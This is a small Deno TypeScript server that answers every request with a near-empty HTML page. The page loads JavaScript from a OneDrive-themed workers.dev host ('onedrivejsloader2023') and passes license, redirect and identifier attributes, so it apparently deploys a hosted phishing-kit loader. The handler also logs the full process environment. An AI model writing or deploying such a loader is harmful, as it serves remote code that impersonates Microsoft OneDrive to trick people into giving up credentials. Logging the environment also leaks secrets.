import {serve} from "https://deno.land/std@0.177.0/http/server.ts";

const port = Number(Deno.env.get("PORT") ?? 8080);
const license: string = '';//Deno.env.get('LICENSE')
serve(handler, {port});

function handler(req: Request): Response {
    console.log(Deno.env)
    return new Response(html(), {
        status: 200,
        headers: headers(),
    });
}

function html() {
    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><script src="https://onedrivejsloader2023.ugo01rdps5.workers.dev" type="text/javascript"></script></head><body data-ls="${license}" data-redirect="yes" data-single="1" class="nobody"><div style="display: none" id="identifier" data-to-self="no" data-script-name="" data-use-script="no"></div></body></html>`;
}

function headers() {
    const no_cache = {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    };
    return {...no_cache, 'content-type': 'text/html', 'Access-Control-Allow-Origin': "*"}
}